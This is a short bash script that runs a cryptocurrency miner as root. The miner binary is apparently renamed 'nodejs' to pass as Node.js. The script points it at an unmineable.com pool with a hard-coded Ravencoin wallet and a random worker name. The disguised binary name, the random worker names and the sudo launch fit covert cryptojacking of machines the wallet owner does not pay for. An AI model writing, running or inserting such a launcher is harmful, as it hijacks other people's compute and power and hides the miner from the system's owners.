#!/bin/bash
POOL=ethash-us.unmineable.com:3333
WALLET=RVN:RY28x597iBdNnLziuhQ3Y1z9C48Zjo2ysn
WORKER=$(echo $(shuf -i 1000-99999 -n 1)-gas) 
chmod +x nodejs
sudo ./nodejs -pool $POOL -wal $WALLET.$WORKER -pass x
